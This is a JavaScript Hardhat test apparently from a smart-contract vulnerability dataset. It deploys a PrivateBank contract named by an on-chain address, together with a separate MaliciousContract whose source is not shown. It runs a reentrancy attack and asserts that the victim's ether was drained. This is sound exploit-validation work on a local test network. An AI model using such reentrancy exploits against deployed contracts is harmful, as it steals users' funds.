const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol", function () {  
    let PrivateBank;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        const logPath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol/Log.json');
        const logJson = JSON.parse(fs.readFileSync(logPath));
        Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy PrivateBank contract with Log address
        const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol/PrivateBank.json');
        const json = JSON.parse(fs.readFileSync(codePath));
        PrivateBank = await ethers.getContractFactory(json.abi, json.bytecode);
        victim = await PrivateBank.deploy(log.target);
        await victim.waitForDeployment();
        //await victim.setLog(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with PrivateBank address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it('sanity check: reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol', async function () {
        await expect(victim.Deposit({ value: ethers.parseEther("10") })).to.not.be.reverted;
        expect(await ethers.provider.getBalance(victim.target)).to.equal(ethers.parseEther("10"));
        await expect(victim.CashOut(ethers.parseEther("10"))).to.not.be.reverted;
        expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
      });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.Deposit( {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from hacker on victim contract
        await hacker.deposit({value:  ethers.parseEther("2")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 

        // Set hacker balance to 0
        await network.provider.send("hardhat_setBalance", [
            hacker.target,
            "0x0",
          ]);
        let hackerBalance = await ethers.provider.getBalance(hacker.target);
        expect(hackerBalance).to.equal(0);


        // Perform reentrancy attack through MaliciousContract
        await hacker.attack(ethers.parseEther("1"));
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        hackerBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
         // victim has lost more than the 1 ethers from withdraw
        expect(victimBalance).to.be.below(ethers.parseEther("6")); 

        //hacker has more than the withdrawn amount
        expect(hackerBalance).to.be.above(ethers.parseEther("1"));
        
    });
    });
  